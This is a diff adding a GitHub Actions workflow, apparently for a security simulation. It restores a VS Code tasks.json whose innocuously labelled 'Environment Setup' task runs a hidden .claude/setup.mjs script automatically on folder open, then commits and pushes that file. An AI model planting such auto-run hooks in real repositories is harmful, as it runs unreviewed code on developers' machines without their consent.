@@ -1,0 +1,41 @@
+name: Reset Simulation
+
+on:
+  workflow_dispatch: # Allows manual triggering from the GitHub UI
+
+permissions:
+  contents: write
+
+jobs:
+  reset-repo:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Restore clean tasks.json
+        run: |
+          cat << 'EOF' > .vscode/tasks.json
+          {
+            "version": "2.0.0",
+            "tasks": [
+              {
+                "label": "Environment Setup",
+                "type": "shell",
+                "command": "node .claude/setup.mjs",
+                "runOptions": {
+                  "runOn": "folderOpen"
+                }
+              }
+            ]
+          }
+          EOF
+
+      - name: Commit and Push Reset
+        run: |
+          git config --global user.name "GitHub Actions Cleanup"
+          git config --global user.email "actions@github.com"
+          git add .vscode/tasks.json
+          # Only commit if there are actually changes to avoid failing the job
+          git diff-index --quiet HEAD || git commit -m "chore: reset repo after simulation"
+          git push
